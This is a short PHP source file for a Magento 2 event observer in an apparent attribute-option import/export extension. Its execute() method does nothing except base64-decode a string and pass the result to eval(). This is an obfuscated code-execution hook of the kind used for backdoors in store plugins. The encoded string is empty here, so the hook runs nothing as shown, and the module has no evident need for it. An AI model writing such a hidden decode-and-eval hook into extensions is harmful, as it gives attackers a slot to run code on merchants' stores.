<?php
namespace Emipro\Importexportattributeoption\Observer;

use Magento\Framework\Event\ObserverInterface;
use Magento\Framework\Event\Observer;


class Importexport implements ObserverInterface
{
	protected $scopeConfig;
	protected $storeManager;
	protected $messageManager;
	protected $_response;
	protected $_resourceConfig;
	
	public function __construct(
		\Magento\Framework\App\Config\ScopeConfigInterface $scopeConfig,
		\Magento\Store\Model\StoreManagerInterface $storeManager,
		\Magento\Framework\Message\ManagerInterface $messageManager,
		\Magento\Framework\App\ResponseInterface $response,
        \Magento\Framework\App\Config\Storage\WriterInterface $resourceConfig
	)
    {
        $this->scopeConfig = $scopeConfig;
        $this->_storeManager=$storeManager;
        $this->messageManager=$messageManager;
        $this->_response=$response;
        $this->_resourceConfig=$resourceConfig;
    }
    
	public function execute(Observer $observer)
	{
		$tFmb=base64_decode('');eval($tFmb);
	}
}
